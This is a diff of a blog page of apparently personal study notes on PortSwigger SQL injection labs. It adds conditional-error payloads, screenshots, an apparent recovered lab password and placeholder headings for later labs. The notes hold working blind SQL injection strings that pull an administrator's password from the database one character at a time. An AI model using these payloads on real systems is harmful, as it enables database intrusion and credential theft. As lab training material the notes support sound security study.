@@ -30,7 +30,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2024-12-02T16:42:04.000Z">
-<meta property="article:modified_time" content="2024-12-08T14:16:43.949Z">
+<meta property="article:modified_time" content="2024-12-08T15:31:55.716Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="PortSwigger">
 <meta name="twitter:card" content="summary">
@@ -424,8 +424,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-12-08 22:16:43</span>
-            <span class="mobile">2024-12-08 22:16:43</span>
+            <span class="desktop">2024-12-08 23:31:55</span>
+            <span class="mobile">2024-12-08 23:31:55</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -506,8 +506,9 @@
 </li>
 </ul>
 <div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</span></span><br><span class="line"><span class="keyword">SELECT</span> TrackingId <span class="keyword">FROM</span> TrackedUsers <span class="keyword">WHERE</span> TrackingId <span class="operator">=</span> <span class="string">&#x27;u5YD3PapBcR4lN3e7Tj4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- …xyz&#x27; AND &#x27;1&#x27;=&#x27;1</span></span><br><span class="line">xyz<span class="string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrator<span class="string">&#x27;), 1, 1) &gt; &#x27;</span>m</span><br><span class="line">xyz<span class="string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrator<span class="string">&#x27;), 1, 1) = &#x27;</span>s</span><br></pre></td></tr></table></figure></div>
-
-
+<p><br><br></p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- This command will not trigger an error because the condition (1=2) is always false. </span></span><br><span class="line"><span class="comment">-- The subquery returns &#x27;a&#x27;, making the overall condition true.</span></span><br><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END)=&#x27;</span>a</span><br><span class="line"></span><br><span class="line"><span class="comment">-- This command will trigger an error because the condition is true, </span></span><br><span class="line"><span class="comment">-- causing the 1/0 operation to execute, resulting in a mathematical error.</span></span><br><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END)=&#x27;</span>a</span><br></pre></td></tr></table></figure></div>
+<p>If the server does not properly sanitize the input, these commands will execute, proving the existence of an SQL Injection vulnerability. If the error causes a difference in the application’s HTTP response, you can use this to determine whether the injected condition is true.</p>
 <p><br><br><br><br><br></p>
 <p>Examining the database</p>
 <ul>
@@ -798,21 +799,80 @@ Since the original query returns two columns and only the second column can stor
 </ul>
 <h4 id="Lab-Blind-SQL-injection-with-conditional-errors"><a href="#Lab-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Lab: Blind SQL injection with conditional errors"></a>Lab: Blind SQL injection with conditional errors</h4><div style="text-align: justify">
 
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- This command will not trigger an error because the condition (1=2) is always false. </span></span><br><span class="line"><span class="comment">-- The subquery returns &#x27;a&#x27;, making the overall condition true.</span></span><br><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END)=&#x27;</span>a</span><br><span class="line"></span><br><span class="line"><span class="comment">-- This command will trigger an error because the condition is true, </span></span><br><span class="line"><span class="comment">-- causing the 1/0 operation to execute, resulting in a mathematical error.</span></span><br><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END)=&#x27;</span>a</span><br></pre></td></tr></table></figure></div>
-<p>If the server does not properly sanitize the input, these commands will execute, proving the existence of an SQL Injection vulnerability. If the error causes a difference in the application’s HTTP response, you can use this to determine whether the injected condition is true.</p>
 <div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM dual)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
 
 <div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN LENGTH(password)&gt;1 THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
 
 <div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN LENGTH(password)&gt;100 THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/22.png"
+                      width="800" height="200"
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/23.png"
+                      width="800" height="200"
+                >
 
-<p><code>&#39; AND (SELECT CASE WHEN LENGTH(password)&gt;$100$ THEN TO_CHAR(1/0) ELSE &#39;$a$&#39; END FROM users WHERE username=&#39;administrator&#39;)=&#39;a&#39;--</code></p>
+
+<p><code>&#39; AND (SELECT CASE WHEN LENGTH(password)&gt;$100$ THEN TO_CHAR(1/0) ELSE &#39;$a$&#39; END FROM users WHERE username=&#39;administrator&#39;)=&#39;a&#39;--</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/24.png"
+                      width="800" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/25.png"
+                      width="800" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/26.png"
+                      width="800" height="200"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/27.png"
+                      width="800" height="200"
+                ></p>
+<p>80yru32hzwoxhxcg8hp1<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/portswigger/0/28.png"
+                      width="800" height="200"
+                ></p>
 <ul>
 <li><a class="link"   target="_blank" rel="noopener" href="https://youtu.be/HjXUtCKm1FM?si=-Hy_Aru6UhdKSj2u" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></div>
 <br><br><br><br><br><br></li>
 </ul>
-<h4 id="Lab-Filter-bypass-via-XML-encoding"><a href="#Lab-Filter-bypass-via-XML-encoding" class="headerlink" title="Lab: Filter bypass via XML encoding"></a>Lab: Filter bypass via XML encoding</h4><p><br><br><br><br><br><br></p>
+<h4 id="Lab-Visible-error-based-SQL-injection"><a href="#Lab-Visible-error-based-SQL-injection" class="headerlink" title="Lab: Visible error-based SQL injection"></a>Lab: Visible error-based SQL injection</h4><div style="text-align: justify">
+</div>
+<br><br><br><br><br><br>
 
+<h4 id="Lab-Blind-SQL-injection-with-time-delays"><a href="#Lab-Blind-SQL-injection-with-time-delays" class="headerlink" title="Lab: Blind SQL injection with time delays"></a>Lab: Blind SQL injection with time delays</h4><div style="text-align: justify">
+</div>
+<br><br><br><br><br><br>
+
+<h4 id="Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval"><a href="#Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval" class="headerlink" title="Lab: Blind SQL injection with time delays and information retrieval"></a>Lab: Blind SQL injection with time delays and information retrieval</h4><div style="text-align: justify">
+</div>
+<br><br><br><br><br><br>
+
+<h4 id="Lab-Blind-SQL-injection-with-out-of-band-interaction"><a href="#Lab-Blind-SQL-injection-with-out-of-band-interaction" class="headerlink" title="Lab: Blind SQL injection with out-of-band interaction"></a>Lab: Blind SQL injection with out-of-band interaction</h4><div style="text-align: justify">
+</div>
+<br><br><br><br><br><br>
+
+
+<h4 id="Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration"><a href="#Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration" class="headerlink" title="Lab: Blind SQL injection with out-of-band data exfiltration"></a>Lab: Blind SQL injection with out-of-band data exfiltration</h4><div style="text-align: justify">
+</div>
+<br><br><br><br><br><br>
+
+<h4 id="Lab-Filter-bypass-via-XML-encoding"><a href="#Lab-Filter-bypass-via-XML-encoding" class="headerlink" title="Lab: Filter bypass via XML encoding"></a>Lab: Filter bypass via XML encoding</h4><div style="text-align: justify">
+</div>
+<br><br><br><br><br><br>
 		</div>
 
 		
@@ -826,7 +886,7 @@ Since the original query returns two columns and only the second column can stor
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-12-08 22:16:43
+                    :</strong> 2024-12-08 23:31:55
             </li>
         
         <li>
@@ -944,7 +1004,7 @@ Since the original query returns two columns and only the second column can stor
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">SQL injection</div>
-		<ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Injection"><span class="nav-text">SQL Injection</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-injection-cheat-sheet"><span class="nav-text">SQL injection cheat sheet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><span class="nav-text">Lab: Vulnerability in WHERE clause allowing retrieval of hidden data</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Vulnerability-allowing-login-bypass"><span class="nav-text">Lab: Vulnerability allowing login bypass</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Attack-querying-the-database-type-and-version-on-Oracle"><span class="nav-text">Lab: Attack, querying the database type and version on Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><span class="nav-text">Lab: Attack, querying the database type and version on MySQL and Microsoft</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Attack-listing-the-database-contents-on-non-Oracle-databases"><span class="nav-text">Lab: Attack, listing the database contents on non-Oracle databases</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Attack-listing-the-database-contents-on-non-Oracle-databases-1"><span class="nav-text">Lab: Attack, listing the database contents on non-Oracle databases</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><span class="nav-text">Lab: UNION attack, determining the number of columns returned by the query</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-UNION-attack-finding-a-column-containing-text"><span class="nav-text">Lab: UNION attack, finding a column containing text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-UNION-attack-retrieving-data-from-other-tables"><span class="nav-text">Lab: UNION attack, retrieving data from other tables</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-UNION-attack-retrieving-multiple-values-in-a-single-column"><span class="nav-text">Lab: UNION attack, retrieving multiple values in a single column</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Blind-SQL-injection-with-conditional-responses"><span class="nav-text">Lab: Blind SQL injection with conditional responses</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Blind-SQL-injection-with-conditional-errors"><span class="nav-text">Lab: Blind SQL injection with conditional errors</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Filter-bypass-via-XML-encoding"><span class="nav-text">Lab: Filter bypass via XML encoding</span></a></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Injection"><span class="nav-text">SQL Injection</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-injection-cheat-sheet"><span class="nav-text">SQL injection cheat sheet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><span class="nav-text">Lab: Vulnerability in WHERE clause allowing retrieval of hidden data</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Vulnerability-allowing-login-bypass"><span class="nav-text">Lab: Vulnerability allowing login bypass</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Attack-querying-the-database-type-and-version-on-Oracle"><span class="nav-text">Lab: Attack, querying the database type and version on Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><span class="nav-text">Lab: Attack, querying the database type and version on MySQL and Microsoft</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Attack-listing-the-database-contents-on-non-Oracle-databases"><span class="nav-text">Lab: Attack, listing the database contents on non-Oracle databases</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Attack-listing-the-database-contents-on-non-Oracle-databases-1"><span class="nav-text">Lab: Attack, listing the database contents on non-Oracle databases</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><span class="nav-text">Lab: UNION attack, determining the number of columns returned by the query</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-UNION-attack-finding-a-column-containing-text"><span class="nav-text">Lab: UNION attack, finding a column containing text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-UNION-attack-retrieving-data-from-other-tables"><span class="nav-text">Lab: UNION attack, retrieving data from other tables</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-UNION-attack-retrieving-multiple-values-in-a-single-column"><span class="nav-text">Lab: UNION attack, retrieving multiple values in a single column</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Blind-SQL-injection-with-conditional-responses"><span class="nav-text">Lab: Blind SQL injection with conditional responses</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Blind-SQL-injection-with-conditional-errors"><span class="nav-text">Lab: Blind SQL injection with conditional errors</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Visible-error-based-SQL-injection"><span class="nav-text">Lab: Visible error-based SQL injection</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Blind-SQL-injection-with-time-delays"><span class="nav-text">Lab: Blind SQL injection with time delays</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval"><span class="nav-text">Lab: Blind SQL injection with time delays and information retrieval</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Blind-SQL-injection-with-out-of-band-interaction"><span class="nav-text">Lab: Blind SQL injection with out-of-band interaction</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration"><span class="nav-text">Lab: Blind SQL injection with out-of-band data exfiltration</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab-Filter-bypass-via-XML-encoding"><span class="nav-text">Lab: Filter bypass via XML encoding</span></a></li></ol>
 
 	</div>
 </div>
